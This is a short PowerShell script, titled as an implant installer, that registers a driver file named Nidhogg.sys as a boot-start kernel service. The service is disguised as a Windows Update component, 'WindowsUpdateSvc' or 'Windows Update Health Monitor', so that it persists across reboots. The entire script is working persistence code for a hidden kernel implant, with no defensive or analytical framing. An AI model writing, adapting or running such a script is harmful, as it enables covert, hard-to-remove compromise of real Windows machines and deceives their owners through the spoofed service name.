# Install_Implant_PreBoot.ps1 - PERMANENT DRIVER VERSION (start= boot)
$TargetDir = "C:\Windows\System32"
$DriverPath = "$TargetDir\drivers\Nidhogg.sys"
$ServiceName = "WindowsUpdateSvc"

Write-Host "[+] Starting PERMANENT Driver Installation..." -ForegroundColor Cyan

# 1. Clean up any old/broken service first
if (Get-Service $ServiceName -ErrorAction SilentlyContinue) {
    Write-Host "[+] Stopping and deleting old service..." -ForegroundColor Yellow
    sc.exe stop $ServiceName > $null 2>&1
    sc.exe delete $ServiceName > $null 2>&1
    Start-Sleep -Seconds 3
}

# 2. Create the service as a true boot-start kernel driver
Write-Host "[+] Creating kernel driver service (boot start)..." -ForegroundColor Cyan
sc.exe create $ServiceName type= kernel start= boot binPath= "$DriverPath" DisplayName= "Windows Update Health Monitor" > $null 2>&1

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Service created successfully" -ForegroundColor Green
} else {
    Write-Host "[-] Service creation failed" -ForegroundColor Red
}

# 3. Start it immediately for testing
sc.exe start $ServiceName > $null 2>&1
Write-Host "[+] Driver service started" -ForegroundColor Green

# 4. Show current status
Write-Host "`nCurrent service status:" -ForegroundColor Cyan
sc.exe query $ServiceName

Write-Host "`n=== PERMANENT Driver Installation Complete ===" -ForegroundColor Green
Write-Host "Reboot now and check with: sc.exe query WindowsUpdateSvc" -ForegroundColor Yellow